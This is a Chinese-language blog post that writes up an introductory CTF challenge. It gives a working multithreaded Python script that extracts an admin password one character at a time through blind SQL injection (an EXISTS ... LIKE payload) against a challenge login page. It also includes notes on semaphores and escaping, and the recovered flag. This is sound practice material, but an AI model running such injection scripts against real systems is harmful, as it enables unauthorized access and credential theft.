---
layout: post
author: "kele"
date: "2018-08-16 11:43:39"
titile: "sql injection to find password"  
tags: 
  - python
---
# sql injection to find password
题目地址:https://introctf.herokuapp.com/chall/2    

一个靶机上有两道题目，第一道很简单，就是sql注入登陆即可，第二道用到了sql中的exists like 猜解密码    
[参考地址](http://sqlzoo.net/hack/16password)   

写个python脚本磕磕绊绊用了一下午才调试成功，主要是单线程太慢，多线程又有许多的限制没有搞定      
简单说一下多线程的几个坑：   
1. 因为爆破的是一个密码，所以在修改密码的时候只能有一个线程修改密码，密码需要一个互斥量  
2. 线程不能太多，需要控制线程数，所以需要一个互斥量来控制线程数  
3. 因为flag中会有'_'字符，但是在sql中的like 子句中 `_`代表的是任意一个字符，所以需要使用转移语法   
4. ** 假如你的程序越来越慢，最后卡死的话，不妨检查检查互斥量的值是不是一直减少，线程数逐渐减少**

```python
import requests
import string
import threading



maxconnection=5
connection_lock=threading.BoundedSemaphore(value=maxconnection)
passwdlock=threading.Semaphore(1)
foundlock=threading.Semaphore(1)



url='https://ctfprob2.herokuapp.com/bobsadminpage/login.php'
dictionary=string.ascii_letters+'{}'+string.digits+'_'






passwd="fl"
#bug1=flag{sql_1nJ3C
Found=False
#final password: flag{sql_1nJ3C710N_1S_k3WL}

def brutepassword(d):
    global passwd
    global Found
    if Found:
        #一定要添加connection_lock.release()，否则直接return false,导致互斥量越来越少，最终只剩下主进程，陷入无限死循环中
        connection_lock.release()
        return False
    data={'username':'admin','password':''}
    if d=='_':
        d='/_'
    #使用了escape 定义了转义符为/,所以like中的'/_'代表就是转义字符'_'
    data['password']="' or exists(select * from users where username='admin' and password like '" +passwd+d+"%' escape '/') and ''='"
    html=requests.post(url,data=data).text
    if 'script' in html:#right
        Found=True
        #passwdlock.acquire()
        #因为有的时候d会被转义是两个字符'\_',但是我们只需要最后一个字符就可以了
        passwd=passwd+d[-1]
        #passwdlock.release()
        print('current password: '+passwd)
        if(d=='}'):
            print('final password: '+passwd)
            exit(0)
    else:
        #print("wrong word: "+passwd+d)
        pass
    
    connection_lock.release()







def main():
    global Found
    global passwd
    
    #thread=[]
    #p=Pool(processes=5) 244
    while True:
        for d in dictionary:
            connection_lock.acquire()
            t=threading.Thread(target=brutepassword,args=d)
            num=threading.active_count()
            #print(num)
            #print(connection_lock._value)
            #print(connection_lock)
            t.start()
            #thread.append(t)
            #p.apply_async(func,args=d)
            if Found:
                #foundlock.release()
                break
    

        Found=False

        if '}' in passwd:
            break



if __name__ == '__main__':
    main()
    '''
    p=Pool(4)
    while True:
        for i in range(10):
            p.apply_async(func,str(i))

    p.close()
    p.join()
    '''
```

ps： multiprocessing 是多进程，但是stackover上提到它有个隐藏的多线程的接口，比较坑爹的是multipocessing需要一口气把进程全添加到进程池之后，关闭进程池，进程才开始运行。
threadpool库已经过于陈旧，所以不推荐使用
简单的多线程可以使用互斥量实现一个简单的线程池，上面的代码就实现了一个线程池